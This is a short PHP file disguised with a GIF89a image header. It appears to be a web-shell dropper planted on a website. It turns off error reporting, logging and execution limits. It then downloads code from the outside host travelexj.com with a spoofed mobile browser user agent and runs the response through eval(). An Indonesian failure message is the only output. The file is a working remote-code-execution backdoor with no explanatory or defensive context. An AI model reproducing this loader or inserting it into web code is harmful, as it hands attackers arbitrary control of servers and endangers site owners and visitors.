<!-- GIF89;a -->
<?php
@set_time_limit(0);
@clearstatcache();
@error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');

$ip_server = "travelexj.com";
$url_path = "/img/r/26f6f7";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://" . $ip_server . $url_path);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: travelexj.com')); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36');
$data = curl_exec($ch);
curl_close($ch);

if ($data) {
    eval("?>" . $data);
} else {
    echo "Masih gagal: " . curl_error($ch);
}
?>